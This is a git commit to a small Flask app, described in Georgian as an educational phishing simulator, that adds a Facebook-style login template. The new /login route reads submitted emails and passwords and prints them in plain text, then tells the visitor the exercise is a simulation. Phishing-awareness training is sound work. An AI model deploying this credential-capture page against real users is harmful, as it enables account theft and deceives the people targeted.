05f47992b92cdfa423989e90b2b4b1bd40170266
N1kusha01 <n_sekhniashvili@cu.edu.ge>
2026-03-08 07:43:37 +0400

    Add files via upload
    added Facebook login template and updated app.py

--- app.py
+++ app.py
@@ -1,11 +1,22 @@
-from flask import Flask
+from flask import Flask, render_template, request
 
 app = Flask(__name__)
 
 @app.route('/')
 
 def home():
-    return "<h1>ჩემი პროექტი მუშაობს</h1><p>ფიშინგ-სიმულატორის საწყისი ეტაპი</p>"
+    #ხსნის intel.html 
+    return render_template('index.html')
+
+@app.route('/login', methods = ['POST'])
+def login():
+    #მონაცემები რასაც მომხმარებელი შეიყვანს
+    email = request.form.get('email')
+    password = request.form.get('password')
+
+    print(f"მონაცემები მოვიდა! Email: {email}, Password: {password}")
+
+    return "<h1>ეს არის საგანმანათლებლო სიმულაცია</h1><p>თქვენი მონაცემები არსად არ გაიგზავნება</p>"
 
 if __name__ == '__main__':
     app.run(debug = True)
